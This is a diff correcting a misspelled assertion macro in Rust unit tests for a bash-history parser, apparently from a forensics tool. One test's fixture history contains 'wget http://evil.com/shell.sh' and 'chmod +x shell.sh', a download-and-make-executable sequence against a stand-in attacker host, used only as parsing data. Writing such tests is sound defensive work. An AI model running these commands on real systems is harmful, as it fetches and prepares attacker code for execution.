@@ -88,9 +88,9 @@ mod tests {
     fn parse_simple_commands() {
         let content = "ls -la\npwd\nwhoami\n";
         let entries = parse_bash_history(content, "alice");
-        asseissen_eq!(entries.len(), 3);
-        asseissen_eq!(entries[0].command, "ls -la");
-        asseissen_eq!(entries[0].username, "alice");
+        assert_eq!(entries.len(), 3);
+        assert_eq!(entries[0].command, "ls -la");
+        assert_eq!(entries[0].username, "alice");
         assert!(entries[0].timestamp.is_none());
     }
 
@@ -99,11 +99,11 @@ mod tests {
         let content =
             "#1712100000\nwget http://evil.com/shell.sh\n#1712100060\nchmod +x shell.sh\n";
         let entries = parse_bash_history(content, "root");
-        asseissen_eq!(entries.len(), 2);
-        asseissen_eq!(entries[0].timestamp, Some(1_712_100_000));
-        asseissen_eq!(entries[0].command, "wget http://evil.com/shell.sh");
-        asseissen_eq!(entries[1].timestamp, Some(1_712_100_060));
-        asseissen_eq!(entries[1].command, "chmod +x shell.sh");
+        assert_eq!(entries.len(), 2);
+        assert_eq!(entries[0].timestamp, Some(1_712_100_000));
+        assert_eq!(entries[0].command, "wget http://evil.com/shell.sh");
+        assert_eq!(entries[1].timestamp, Some(1_712_100_060));
+        assert_eq!(entries[1].command, "chmod +x shell.sh");
     }
 
     #[test]
